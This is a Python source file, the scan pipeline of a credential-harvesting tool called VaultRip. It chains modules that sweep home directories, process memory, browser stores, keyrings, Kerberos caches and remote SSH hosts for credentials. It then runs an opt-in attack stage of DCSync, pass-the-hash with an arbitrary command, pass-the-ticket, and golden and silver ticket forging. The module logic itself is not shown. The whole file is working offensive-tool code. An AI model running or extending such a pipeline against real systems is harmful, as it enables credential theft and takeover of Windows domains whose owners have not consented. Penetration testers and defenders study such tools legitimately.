# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""
VaultRip scan pipeline orchestration.

Runs the harvesting modules in sequence:
  passive → local → memory → browser → system → kerberos → dump → remote → attacks
"""

from __future__ import annotations

import logging

from ..reporter import ScanResult
from . import browser as _browser
from . import dcsync as _dcsync
from . import dump as _dump
from . import kerberos as _kerberos
from . import kerberos_forge as _kerberos_forge
from . import local as _local
from . import memory as _memory
from . import passive as _passive
from . import pth as _pth
from . import remote as _remote
from . import system as _system
from .options import ScanOptions

log = logging.getLogger("vaultrip.pipeline")


def run(options: ScanOptions, result: ScanResult) -> None:
    """Execute the full credential harvesting pipeline."""

    # --- Passive (always runs — no sensitive reads) -----------------------
    log.info("pipeline: passive collection")
    passive_info = _passive.collect(target_user=options.target_user)

    # --- Local filesystem sweep ------------------------------------------
    if options.local:
        log.info("pipeline: local filesystem sweep (%d home dirs)", len(passive_info.home_dirs))
        try:
            _local.run(result, passive_info)
        except Exception as exc:  # noqa: BLE001
            result.append_error(f"local sweep error: {exc}")
            log.exception("pipeline: local sweep failed")

    # --- Process memory scan ----------------------------------------------
    if options.memory:
        log.info("pipeline: memory scan (pid=%s)", options.target_pid or "all")
        try:
            _memory.run(result, passive_info, target_pid=options.target_pid)
        except Exception as exc:  # noqa: BLE001
            result.append_error(f"memory scan error: {exc}")
            log.exception("pipeline: memory scan failed")

    # --- Browser stores ---------------------------------------------------
    if options.browser:
        log.info("pipeline: browser credential stores")
        try:
            _browser.run(result, passive_info)
        except Exception as exc:  # noqa: BLE001
            result.append_error(f"browser scan error: {exc}")
            log.exception("pipeline: browser scan failed")

    # --- System keyrings / config files -----------------------------------
    if options.system:
        log.info("pipeline: system credential stores")
        try:
            _system.run(result, passive_info)
        except Exception as exc:  # noqa: BLE001
            result.append_error(f"system scan error: {exc}")
            log.exception("pipeline: system scan failed")

    # --- Kerberos ccache / keytab -----------------------------------------
    if options.kerberos:
        log.info("pipeline: kerberos ticket extraction")
        try:
            _kerberos.run(result, passive_info)
        except Exception as exc:  # noqa: BLE001
            result.append_error(f"kerberos scan error: {exc}")
            log.exception("pipeline: kerberos scan failed")

    # --- Offline dump parsing ---------------------------------------------
    if options.dumps and options.dump_path:
        log.info("pipeline: offline dump parsing: %s", options.dump_path)
        try:
            _dump.run(result, options.dump_path)
        except Exception as exc:  # noqa: BLE001
            result.append_error(f"dump parse error: {exc}")
            log.exception("pipeline: dump parsing failed")

    # --- Remote SSH harvesting --------------------------------------------
    if options.remote and options.ssh_host:
        log.info("pipeline: remote harvesting via SSH → %s", options.ssh_host)
        try:
            _remote.run(
                result,
                ssh_host=options.ssh_host,
                ssh_user=options.ssh_user,
                ssh_key=options.ssh_key or None,
                ssh_password=options.ssh_password or None,
                ssh_port=options.ssh_port,
                timeout=options.timeout,
            )
        except Exception as exc:  # noqa: BLE001
            result.append_error(f"remote harvest error: {exc}")
            log.exception("pipeline: remote harvest failed")

    # --- Attack modules (explicit opt-in — active operations) ---------------
    _has_attacks = any([
        options.dcsync, options.pth, options.ptt,
        options.forge_golden, options.forge_silver,
    ])
    if _has_attacks:
        log.info("pipeline: attack stage")
        try:
            if options.dcsync:
                log.info("pipeline: dcsync → %s", options.dc_host)
                _dcsync.run(
                    result,
                    dc_host=options.dc_host,
                    ad_domain=options.ad_domain,
                    attack_user=options.attack_user,
                    attack_hash=options.attack_hash,
                    timeout=options.timeout,
                )
            if options.pth:
                log.info("pipeline: pth → %s", options.dc_host)
                _pth.run(
                    result,
                    target=options.dc_host,
                    attack_user=options.attack_user,
                    attack_hash=options.attack_hash,
                    ad_domain=options.ad_domain,
                    command=options.attack_cmd,
                    timeout=options.timeout,
                )
            if options.ptt:
                log.info("pipeline: ptt ← %s", options.ptt_ticket)
                _kerberos_forge.run_ptt(result, ticket_path=options.ptt_ticket)
            if options.forge_golden:
                log.info("pipeline: forge golden → %s", options.ad_domain)
                _kerberos_forge.run_forge_golden(
                    result,
                    ad_domain=options.ad_domain,
                    domain_sid=options.domain_sid,
                    krbtgt_hash=options.krbtgt_hash,
                    attack_user=options.attack_user,
                    timeout=options.timeout,
                )
            if options.forge_silver:
                log.info("pipeline: forge silver → %s", options.forge_silver_spn)
                _kerberos_forge.run_forge_silver(
                    result,
                    ad_domain=options.ad_domain,
                    domain_sid=options.domain_sid,
                    attack_hash=options.attack_hash,
                    spn=options.forge_silver_spn,
                    attack_user=options.attack_user,
                    timeout=options.timeout,
                )
        except Exception as exc:  # noqa: BLE001
            result.append_error(f"attack stage: {exc}")
            log.exception("pipeline: attack stage failed")

    log.info(
        "pipeline: complete — %d findings (%d files, %d memory, %d browser, "
        "%d system, %d kerberos, %d dumps, %d dcsync, %d pth, %d forged)",
        result.total_findings,
        len(result.files), len(result.memory), len(result.browser),
        len(result.system), len(result.kerberos), len(result.dumps),
        len(result.dcsync), len(result.pth_results), len(result.forged_tickets),
    )
